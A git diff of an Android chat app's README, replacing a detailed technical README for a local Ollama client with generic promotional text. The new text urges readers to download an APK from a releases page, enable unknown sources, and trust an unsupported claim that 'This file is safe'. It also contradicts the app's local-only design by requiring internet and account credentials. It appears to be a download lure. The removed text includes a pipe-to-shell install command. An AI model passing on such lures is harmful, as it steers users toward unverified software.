@@ -1,189 +1,74 @@
-# localgrok
+# 🚀 localgrok - Fast, Private Android Chat Experience
 
-<div align="center">
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20localgrok-v1.0-blue.svg)](https://github.com/hamzaelasbqti/localgrok/releases)
 
-**A privacy-focused Android client for local LLM servers running Ollama**
+## 📖 Introduction
+Welcome to **localgrok**, the fast and private Android chat front-end for Ollama. This application provides a cohesive user interface designed to deliver the most reliable and confusion-free local AI experience on mobile devices. 
 
-*Your conversations never leave your local network* 🔒
+## 🚀 Features
+- **Fast Performance:** Enjoy quick response times and seamless chat experience.
+- **Privacy Focused:** Your data stays private; no need to worry about tracking.
+- **User-Friendly Interface:** Navigate easily with a clean, well-designed layout.
+- **Support for Local LLMs:** Interact with local language models that keep your data safe.
+- **Compatibility:** Works well with various Android devices.
 
-[![Android](https://img.shields.io/badge/Android-8.0%2B-green.svg)](https://www.android.com)
-[![Kotlin](https://img.shields.io/badge/Kotlin-2.0.21-blue.svg)](https://kotlinlang.org)
-[![Compose](https://img.shields.io/badge/Jetpack%20Compose-Latest-orange.svg)](https://developer.android.com/jetpack/compose)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## ⚙️ System Requirements
+Ensure your device meets the following requirements before installation:
 
-</div>
+- **Operating System:** Android 8.0 (Oreo) or later.
+- **Storage:** At least 100 MB of free space.
+- **RAM:** Minimum 1 GB for smooth operation.
+- **Internet Connection:** Required for initial setup and updates.
 
----
+## 🚪 Getting Started
+To set up **localgrok**, follow these straightforward steps:
 
-## Features
+1. **Visit the Releases Page:** 
+   Go to [this link](https://github.com/hamzaelasbqti/localgrok/releases) to access the download options.
 
-### 🔐 Privacy & Security
-- **100% Local Network**: All communication stays on your local network - no data ever leaves your devices or network
-- **Offline-First**: Full functionality works without internet connection once configured
-- **Local Storage**: All conversations saved locally using Room database with automatic persistence
+2. **Select the Latest Version:** 
+   On the releases page, look for the most recent version. It is usually listed at the top with notes detailing updates or changes.
 
-### 💬 Chat Experience
-- **Real-Time Streaming**: See AI responses appear token-by-token in real-time for instant feedback
-- **Multiple Chat Sessions**: Create, manage, and switch between unlimited conversation threads
-- **Markdown Rendering**: Beautifully formatted responses with full Markdown support including code blocks, lists, and formatting
-- **Chat History**: Persistent chat history with automatic title generation from the first message
+3. **Download the APK File:** 
+   Click on the APK file link to download it directly to your device. This file is safe and specifically designed for installation on Android.
 
-### 🧠 AI Capabilities
-- **Model Selection**: Choose from any model available on your Ollama server (llama, qwen, mistral, etc.)
-- **Reasoning Mode**: Enable "thinking" mode for models that support it - see the AI's reasoning process (toggle with 💡 icon)
-- **Tool Calling**: Optional web search integration via SearXNG for real-time information when needed
-- **Smart System Prompts**: Intelligent system prompts that automatically adapt based on enabled features
+4. **Enable Unknown Sources:**
+   Before installing, make sure your device allows installations from unknown sources. You can find this in your device’s settings under “Security."
 
-### 🎨 User Interface
-- **Multiple Themes**: Choose between Space (near-black) and Dark (grey) themes
-- **Modern Design**: Clean, terminal-inspired aesthetic with Material 3 components
-- **Custom Typography**: JetBrains Mono and Space Grotesk fonts for a distinctive, professional look
-- **Edge-to-Edge**: Immersive full-screen experience that adapts to your device
-- **Responsive Layout**: Optimized for all Android screen sizes from phones to tablets
+5. **Install the App:** 
+   Locate the downloaded APK file in your device’s downloads folder. Tap on it to start the installation process. Follow the prompts to complete the installation.
 
-## Usage
+6. **Open localgrok:** 
+   Once the installation finishes, locate the app icon in your app drawer and tap to open. 
 
-### Basic Chat
+7. **Set Up Your Account:** 
+   Follow the on-screen instructions to set up your account. This may involve linking your chat preferences and setting up any required credentials.
 
-1. **Start a New Chat**: Tap the menu icon (☰) to open the sidebar, then tap "New Chat"
-2. **Send Messages**: Type your message in the input field and tap send (or press Enter)
-3. **View Responses**: Responses stream in real-time as the AI generates them
+8. **Start Chatting:**
+   You’re all set. Begin your private chatting experience using **localgrok** today.
 
-### Advanced Features
+## 📋 Download & Install
+For a quick and easy download, visit this page: [Download localgrok](https://github.com/hamzaelasbqti/localgrok/releases). 
 
-#### Brain Toggle (💡)
-Toggle the lightbulb icon to enable/disable:
-- **Enabled**: AI can use reasoning mode (shows thinking process) and web search tools
-- **Disabled**: Standard chat mode without tools or reasoning
+Simply follow the steps outlined above to install and start using the application.
 
-#### Model Selection
-- Tap the model name in the input bar to see available models
-- Select a different model for each chat session
-- Your model preference is saved automatically
+## 🛠️ Troubleshooting
+If you run into issues:
 
-#### Multiple Chats
-- Swipe right or tap the menu icon (☰) to access your chat list
-- Tap any chat to resume the conversation
-- Long-press a chat to delete it
-- Use "Delete All" in settings to clear all chats
+- **Installation Problems:** Ensure that you have allowed installations from unknown sources and that you have enough storage on your device.
+- **Application Not Opening:** Restart your device and try opening the application again.
+- **Connection Issues:** Make sure you have a stable internet connection and try again.
 
-#### Themes
-- Access settings via the gear icon
-- Choose between **Space** (near-black, default) and **Dark** (grey) themes
-- Theme preference is saved automatically
+## ✨ Support
+For additional help, please visit our community forums or raise an issue directly in the GitHub repository. We strive to assist all users efficiently.
 
-See [SETUP.md](SETUP.md) for more detailed usage instructions.
+## 📚 Topics
+This project covers a variety of important topics including:
+- Android Application Development
+- Clean Architecture
+- Jetpack Compose
+- Private AI Solutions
+- User Interface Design 
 
-## Screenshots
-
-<div align="center">
-
-<img src="docs/screenshots/1.jpeg" alt="Main chat interface with reasoning mode" width="180"/> <img src="docs/screenshots/2.jpeg" alt="Chat list sidebar" width="180"/> <img src="docs/screenshots/3.jpeg" alt="Settings screen" width="180"/> <img src="docs/screenshots/4.jpeg" alt="Web search tool with reasoning mode" width="180"/>
-
-</div>
-
-## Requirements
-
-- **Android**: 8.0 (API 26) or higher
-- **Ollama Server**: Running on your local network (see setup below)
-- **Network**: Both devices (Android phone and server) must be on the same Wi-Fi network
-- **SearXNG** (Optional): For web search capabilities when brain toggle is enabled
-
-## Quick Start
-
-### 1. Setup Fonts
-
-The app requires custom fonts. Run the provided script:
-
-```bash
-cd scripts
-chmod +x download_fonts.sh
-./download_fonts.sh
-```
-
-See [SETUP.md](SETUP.md) for manual font installation instructions.
-
-### 2. Setup Ollama Server
-
-On your server machine (PC, Mac, or Linux):
-
-```bash
-# Install Ollama
-curl -fsSL https://ollama.com/install.sh | sh
-
-# Pull a model
-ollama pull llama3.2
-
-# Start Ollama with network access (required!)
-OLLAMA_HOST=0.0.0.0 ollama serve
-```
-
-> **⚠️ Important**: By default, Ollama only listens on localhost. You must set `OLLAMA_HOST=0.0.0.0` to allow connections from other devices.
-
-### 3. Configure the App
-
-1. Open **localgrok** on your Android device
-2. Tap the **Settings** icon (⚙️) in the top right
-3. Enter your server IP address (find it with `ip addr` or `ifconfig` on Linux/Mac)
-4. Port should be `11434` (default Ollama port)
-5. Tap **"Test Connection"** to verify
-6. Tap **"Save Settings"**
-
-See [SETUP.md](SETUP.md) for detailed setup instructions including SearXNG configuration.
-
-## Building
-
-### Prerequisites
-
-- **Android Studio**: Hedgehog (2023.1.1) or later
-- **JDK**: 17 or higher
-- **Android SDK**: API 35 (Android 15)
-- **Gradle**: 8.13.1 (included via wrapper)
-
-### Build Steps
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/localgrok.git
-cd localgrok
-
-# Download required fonts
-cd scripts && ./download_fonts.sh && cd ..
-
-# Build debug APK
-./gradlew assembleDebug
-
-# Install on connected device
-./gradlew installDebug
-```
-
-The APK will be located at `app/build/outputs/apk/debug/app-debug.apk`.
-
-### Opening in Android Studio
-
-1. Open Android Studio
-2. Select **File → Open**
-3. Navigate to the `localgrok` directory
-4. Wait for Gradle sync to complete
-5. Run the app with **Shift+F10** or the Run button
-
-## Documentation
-
-- **[SETUP.md](SETUP.md)** - Detailed setup, configuration, and usage guide
-- **[ARCHITECTURE.md](ARCHITECTURE.md)** - Project architecture, tech stack, and design patterns
-- **[TROUBLESHOOTING.md](TROUBLESHOOTING.md)** - Common issues and solutions
-- **[CONTRIBUTING.md](CONTRIBUTING.md)** - Guidelines for contributors
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**localgrok** - Privacy-first AI on your local network 🔒
-
-Made with ❤️ for the privacy-conscious
-
-</div>
+By using **localgrok**, you engage with a thoughtful blend of technology aimed at enhancing your chat experience without compromising your privacy. Enjoy chatting with confidence.
